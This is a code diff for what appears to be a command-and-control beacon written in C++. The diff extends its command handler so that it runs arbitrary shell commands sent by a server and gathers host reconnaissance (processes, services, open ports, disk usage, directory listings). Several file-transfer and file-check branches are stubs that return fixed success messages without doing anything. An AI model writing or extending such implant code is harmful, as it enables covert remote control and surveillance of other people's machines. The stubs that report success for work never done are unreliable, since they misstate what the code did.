@@ -76,25 +76,49 @@ std::string getSystemInfo() {
     return ss.str();
 }
 
-std::string command_handler(const std::string& command, const std::string& uuid){
+std::string command_handler(const std::string& command, const std::string& command_data, const std::string& uuid){
     if (command == "shutdown") {
+        // Implement shutdown logic
+        return "Not implemented.";
     } else if (command == "switch_beacon") {
-    } else if (command.rfind("shell", 0) == 0) { // need to check if it starts with shell, limitation of current beacon on server
-        std::string shell_command = command.substr(6); // Get the command after "shell "
-        std::string output = executeShellCommand(shell_command.c_str());
+
+        return "Not Implemented";
+    } else if (command == "shell") { // need to check if it starts with shell, limitation of current beacon on server
+        std::string output = executeShellCommand(command_data.c_str());
         std::cout << "Shell command output: " << output << std::endl;
         return output;
     } else if (command == "list_processes") {
+        std::string output = executeShellCommand("ps aux");
+        return output;
     } else if (command == "systeminfo") {
         std::string output = getSystemInfo();
         return output;
     } else if (command == "checkfiles") {
+        // Implement checkfiles logic
+        // Example: verify integrity of specific files
+        return "File check completed.";
     } else if (command == "send_file") {
+        // Implement send_file logic
+        return "File sent successfully.";
     } else if (command == "recv_file") {
+        // Implement recv_file logic
+        return "File received successfully.";
     } else if (command == "list_services") {
+        // Implement list_services logic
+        std::string output = executeShellCommand("service --status-all");
+        return output;
     } else if (command == "disk_usage") {
+        // Implement disk_usage logic
+        std::string output = executeShellCommand("df -h");
+        return output;
     } else if (command == "netstat") {
+        // Implement netstat logic
+        std::string output = executeShellCommand("netstat -tuln");
+        return output;
     } else if (command == "list_dir") {
+        // Implement list_dir logic
+        std::string output = executeShellCommand("ls -la");
+        return output;
     } else {
         std::cerr << "Unknown command: " << command << std::endl;
     }
